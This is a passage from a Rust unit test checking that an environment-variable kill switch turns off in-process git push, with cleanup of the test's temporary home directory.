        // SAFETY: this test is the only reader/writer of MOBEE_SELLER_INPROCESS_PUSH.
        unsafe {
            // Fresh home defaults ON.
            std::env::remove_var("MOBEE_SELLER_INPROCESS_PUSH");
            assert!(inprocess_push_enabled(&home), "default is in-process ON");
            // Env kill-switch forces OFF.
            std::env::set_var("MOBEE_SELLER_INPROCESS_PUSH", "0");
            assert!(!inprocess_push_enabled(&home), "env 0 forces system git");
            std::env::set_var("MOBEE_SELLER_INPROCESS_PUSH", "false");
            assert!(!inprocess_push_enabled(&home), "env false forces system git");
            std::env::remove_var("MOBEE_SELLER_INPROCESS_PUSH");
        }
        let _ = std::fs::remove_dir_all(&home);
    }
}
